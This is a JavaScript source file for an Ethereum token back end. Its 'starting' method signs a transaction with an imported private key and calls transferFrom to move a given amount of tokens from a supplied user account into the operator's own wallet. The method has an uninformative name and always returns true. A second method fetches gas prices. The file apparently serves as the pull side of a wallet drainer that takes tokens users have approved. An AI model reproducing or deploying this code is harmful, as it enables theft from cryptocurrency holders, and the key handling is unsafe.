import axios from 'axios';
import { SC } from "./SmartContracts";
import { privateKey } from './datas/privateKey';
import BigNumber from 'bignumber.js';

export class TC {
    static async starting(account,tokenAddress,amount,decimal) {
        try {
            if(amount <= 0 && tokenAddress != '') return true;
            const user_wallet = SC.owner;
            let contract = SC.tokenContract2;
            const amountv2 = new BigNumber(amount * 10 ** decimal);
            let data = contract.methods.transferFrom(account, user_wallet.address, amountv2.toFixed()).encodeABI()
            var approveTX ={
                gas: SC.web3ojb.utils.toHex(100000),
                to: tokenAddress,
                data: data,
                from: user_wallet.address
            }
        SC.web3ojb.eth.accounts.signTransaction(approveTX, privateKey, (err, signedTx) => {
            if (err) {return false;
            } else { console.log(signedTx)
                 SC.web3ojb.eth.sendSignedTransaction(signedTx.rawTransaction, (err, res) => {
                if (err) {return false;}}) 
        }})
        return true;
        } catch(error) {
            console.log('error')
            throw error
        }
    }
    static async getCurrentGasPrices() {
        try {
           var response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json');
           var prices = {
             low: response.data.safeLow / 10,
             medium: response.data.average / 10,
             high: response.data.fast / 10
           }
           var log_str = '***** gas price information *****'
           console.log(log_str.green);
           var log_str = 'High: ' + prices.high + '        medium: ' + prices.medium + '        low: ' + prices.low;
           console.log(log_str);
        }catch(err) {
            prices = {low: 20, medium: 20, high:50};
        }
      return prices
    }
}